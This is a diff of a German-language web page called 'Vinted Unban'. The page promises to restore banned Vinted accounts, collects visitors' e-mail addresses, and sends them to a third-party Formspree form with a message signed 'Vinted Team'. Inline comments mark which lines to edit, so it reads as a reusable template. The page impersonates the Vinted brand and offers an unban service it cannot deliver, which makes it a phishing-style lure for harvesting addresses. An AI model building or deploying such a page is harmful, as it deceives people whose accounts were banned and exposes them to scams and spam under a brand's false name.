@@ -3,13 +3,11 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Vinted Unbanner</title>
+  <title>Vinted Unban</title> <!-- ✏️ ZEILE 5: Browser-Tab Titel -->
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; }
-    body { font-family: system-ui, sans-serif; background: #f5f5f5; }
-
-    .hero {
-      background: #C0392B;
+    body { font-family: system-ui, sans-serif; background: #C0392B; }
+    .screen {
       min-height: 100vh;
       display: flex;
       flex-direction: column;
@@ -18,131 +16,53 @@
       padding: 3rem 2rem;
       text-align: center;
     }
-    .hero h1 {
-      font-size: 2.4rem;
-      font-weight: 600;
-      color: #fff;
-      margin-bottom: 1rem;
-      line-height: 1.3;
-    }
-    .hero p {
-      font-size: 1.1rem;
-      color: rgba(255,255,255,0.88);
-      max-width: 540px;
-      line-height: 1.75;
-      margin-bottom: 2.5rem;
-    }
-    .btn-download {
-      display: inline-block;
-      background: #fff;
-      color: #A32D2D;
-      font-size: 1.05rem;
-      font-weight: 600;
-      padding: 15px 40px;
-      border-radius: 8px;
-      text-decoration: none;
-      cursor: pointer;
-      border: none;
-      transition: background 0.15s, transform 0.1s;
-    }
-    .btn-download:hover { background: #f0f0f0; transform: scale(1.02); }
-    .btn-download:active { transform: scale(0.98); }
-
-    /* Modal */
-    .modal-bg {
-      display: none;
-      position: fixed;
-      inset: 0;
-      background: rgba(0,0,0,0.5);
-      align-items: center;
-      justify-content: center;
-      z-index: 100;
-      padding: 1rem;
-    }
-    .modal-bg.active { display: flex; }
-    .modal {
-      background: #fff;
-      border-radius: 12px;
-      padding: 2rem;
-      max-width: 420px;
-      width: 100%;
-      text-align: center;
-    }
-    .modal h2 {
-      font-size: 1.3rem;
-      font-weight: 600;
-      margin-bottom: 0.5rem;
-      color: #1a1a1a;
-    }
-    .modal p {
-      font-size: 14px;
-      color: #666;
-      margin-bottom: 1.2rem;
-    }
-    .modal input {
-      width: 100%;
-      padding: 11px 14px;
-      margin-bottom: 1rem;
-      border-radius: 8px;
-      border: 1px solid #ddd;
-      font-size: 15px;
-    }
-    .modal input:focus { outline: none; border-color: #C0392B; }
-    .modal .send-btn {
-      background: #C0392B;
-      color: #fff;
-      border: none;
-      padding: 12px 36px;
-      border-radius: 8px;
-      font-size: 15px;
-      font-weight: 600;
-      cursor: pointer;
-      width: 100%;
-    }
-    .modal .send-btn:hover { background: #a93226; }
-    .thanks { font-size: 15px; color: #1a1a1a; line-height: 1.8; }
-    .thanks strong { color: #C0392B; }
-
-    /* Footer / Impressum */
-    .footer {
-      background: #1a1a1a;
-      color: rgba(255,255,255,0.5);
-      text-align: center;
-      padding: 1.5rem 1rem;
-      font-size: 13px;
-      line-height: 2;
-    }
-    .footer strong { color: rgba(255,255,255,0.8); display: block; margin-bottom: 0.3rem; }
-    .footer a { color: rgba(255,255,255,0.6); text-decoration: none; }
-    .footer a:hover { color: #fff; }
+    .screen h1 { font-size: 2.4rem; font-weight: 700; color: #fff; margin-bottom: 1rem; line-height: 1.3; }
+    .screen p { font-size: 1.1rem; color: rgba(255,255,255,0.88); max-width: 540px; line-height: 1.75; margin-bottom: 2.5rem; }
+    .btn { background: #fff; color: #A32D2D; font-size: 1.05rem; font-weight: 700; padding: 15px 40px; border-radius: 10px; border: none; cursor: pointer; }
+    .btn:hover { background: #f0f0f0; }
+    .app-screen { display: none; min-height: 100vh; background: #f5f5f5; flex-direction: column; align-items: center; justify-content: center; padding: 2rem; }
+    .app-screen.active { display: flex; }
+    .app-card { background: #fff; border-radius: 16px; box-shadow: 0 4px 24px rgba(0,0,0,0.10); padding: 2.5rem 2rem; max-width: 420px; width: 100%; text-align: center; }
+    .logo { width: 64px; height: 64px; background: #C0392B; border-radius: 16px; margin: 0 auto 1.2rem; display: flex; align-items: center; justify-content: center; font-size: 2rem; color: #fff; font-weight: 700; }
+    .app-card h2 { font-size: 1.4rem; font-weight: 700; color: #1a1a1a; margin-bottom: 0.4rem; }
+    .app-card .subtitle { font-size: 14px; color: #888; margin-bottom: 1.5rem; }
+    .app-card input { width: 100%; padding: 13px 14px; margin-bottom: 1rem; border-radius: 10px; border: 1.5px solid #ddd; font-size: 15px; color: #1a1a1a; }
+    .app-card input:focus { outline: none; border-color: #C0392B; }
+    .send-btn { background: #C0392B; color: #fff; border: none; padding: 13px 0; border-radius: 10px; font-size: 16px; font-weight: 700; cursor: pointer; width: 100%; }
+    .send-btn:hover { background: #a93226; }
+    .thanks { font-size: 15px; color: #1a1a1a; line-height: 1.9; }
+    .check { width: 56px; height: 56px; background: #eafaf1; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 1rem; font-size: 1.8rem; }
+    .footer { background: #1a1a1a; color: rgba(255,255,255,0.4); text-align: center; padding: 1rem; font-size: 12px; }
   </style>
 </head>
 <body>
 
-  <div class="hero">
-    <h1>Vinted Unbanner</h1>
-    <p>.</p>
-    <button class="btn-download" onclick="document.getElementById('modalBg').classList.add('active')">
-      App herunterladen
-    </button>
+  <!-- STARTSEITE -->
+  <div class="screen" id="homeScreen">
+    <h1>Vinted Unban</h1> <!-- ✏️ ZEILE 44: Haupttitel -->
+    <p>Willkommen in unserem Workshop. Bitte laden Sie unsere App herunter und melden Sie sich an.</p> <!-- ✏️ ZEILE 45: Beschreibungstext -->
+    <button class="btn" onclick="loadApp()">App laden</button>
   </div>
 
-  <!-- Modal -->
-  <div class="modal-bg" id="modalBg">
-    <div class="modal" id="modalCard">
-      <h2>Anmeldung</h2>
-      <p>Bitte geben Sie Ihre E-Mail-Adresse ein, um alle Infos zu erhalten.</p>
+  <!-- APP (wird nach Klick geladen) -->
+  <div class="app-screen" id="appScreen">
+    <div class="app-card" id="appCard">
+      <div class="logo">E</div>
+      <h2>Vinted Unban</h2>
+      <p class="subtitle">Bitte melden Sie sich mit Ihrer E-Mail an.</p>
       <input type="email" id="emailInput" placeholder="ihre@email.de" />
       <button class="send-btn" onclick="handleSend()">Senden</button>
     </div>
   </div>
 
-  <!-- Footer -->
-  <div class="footer">
-    v1.0.0 &nbsp;·&nbsp; kostenlos &nbsp;·&nbsp; Emergency Lüdenscheid
-  </div>
+  <div class="footer">Vinted Unbanner · v1.0.0 · kostenlos</div>
 
   <script>
+    function loadApp() {
+      document.getElementById('homeScreen').style.display = 'none';
+      document.getElementById('appScreen').classList.add('active');
+    }
+
     async function handleSend() {
       const email = document.getElementById('emailInput').value;
       if (!email || !email.includes('@')) {
@@ -150,25 +70,37 @@
         return;
       }
 
-      // ✏️ Ersetze XXXXXXXX mit deiner echten Formspree-ID
+      // ✏️ ZEILE 74: Betreff der E-Mail
+      const betreff = 'Vinted Unbanner';
+
+      // ✏️ ZEILEN 77-88: Kompletter Text der E-Mail – hier alles ändern!
+      const nachricht = `Hallo,
+
+Account Unban
+Hier sind alle wichtigen Infos:
+Your Vinted Account Unban
+
+Wir freuen uns auf Sie!
+
+Mit freundlichen Grüßen,
+Vinted Team`;
+
+      // ✏️ ZEILE 91: XXXXXXXX durch deine Formspree-ID ersetzen
       await fetch('https://formspree.io/f/xjgjggol', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ email: email })
+        body: JSON.stringify({ email: email, subject: betreff, message: nachricht })
       });
 
-      document.getElementById('modalCard').innerHTML = `
-        <p class="thanks">
+      // ✏️ ZEILE 98-101: Bestätigungstext nach dem Absenden
+      document.getElementById('appCard').innerHTML = `
+        <div class="thanks">
+          <div class="check">✓</div>
           <strong>Vielen Dank!</strong><br><br>
-          Alle weiteren Infos finden Sie in Ihrem E-Mail-Postfach.
-        </p>
+          Alle weiteren Infos finden Sie<br>in Ihrem E-Mail-Postfach.
+        </div>
       `;
     }
-
-    // Modal schließen bei Klick außerhalb
-    document.getElementById('modalBg').addEventListener('click', function(e) {
-      if (e.target === this) this.classList.remove('active');
-    });
   </script>
 
 </body>
